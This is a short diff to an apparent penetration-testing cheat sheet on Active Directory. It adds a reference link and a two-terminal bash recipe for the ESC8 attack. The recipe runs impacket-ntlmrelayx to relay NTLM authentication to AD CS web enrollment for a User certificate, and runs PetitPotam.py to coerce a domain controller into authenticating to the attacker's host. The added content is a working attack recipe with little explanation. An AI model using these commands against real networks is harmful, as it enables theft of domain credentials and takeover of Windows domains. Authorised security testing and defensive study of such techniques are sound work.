@@ -225,6 +225,17 @@ Password:
 ```
 
 - [TheHackerRecipes](https://www.thehacker.recipes/ad/movement/dacl/)
+- [Serioton](https://seriotonctf.github.io/ADCS-Attacks-with-Certipy/index.html)
+
+```bash
+# ESC8: NTLM Relay to AD CS Web Enrollment 
+# 1st terminal
+impacket-ntlmrelayx -t http://DC2/certsrv/certfnsh.asp --adcs --template User -smb2support
+
+# 2nd terminal 
+./PetitPotam.py -u $USER -p '$PASS' -d $DOMAIN $KALI-IP DC1
+
+```
 
 ---
 
